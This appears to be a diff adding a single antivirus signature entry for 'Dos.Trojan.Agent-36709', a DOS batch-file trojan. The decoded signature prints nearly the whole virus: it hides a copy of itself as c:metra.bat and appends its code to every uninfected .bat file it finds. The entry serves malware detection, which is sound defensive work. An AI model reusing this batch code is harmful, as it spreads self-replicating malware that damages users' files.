@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36709
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off%[metra]% if '%1=='in_ goto metrain if exist c:metra.bat goto metraru if not exist %0 goto metraen find "metra"<%0>c:metra.bat attrib +h c:metra.bat :metraru for %%t in (*.bat) do call c:metra in_ %%t goto metraen :metrain find "metra"<%2>nul if not errorlevel 1 goto metraen type c:metra.bat>>%2 :metraen
